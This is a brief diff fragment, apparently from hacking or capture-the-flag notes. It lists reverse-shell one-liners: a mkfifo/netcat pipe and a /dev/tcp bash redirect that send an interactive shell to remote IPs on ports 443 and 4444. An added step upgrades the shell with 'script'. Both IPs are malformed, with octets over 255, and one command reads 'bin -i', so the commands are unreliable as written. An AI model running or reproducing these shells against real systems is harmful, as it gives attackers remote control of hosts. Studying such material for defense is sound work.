@@ -31,4 +31,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.159.332 443 >/tmp/f
 or 
 bin -i >& /dev/tcp/10.21.23.434/4444 0>&1
 
+Let’s first spawn a better shell:
 
+$ SHELL=/bin/bash script -q /dev/null
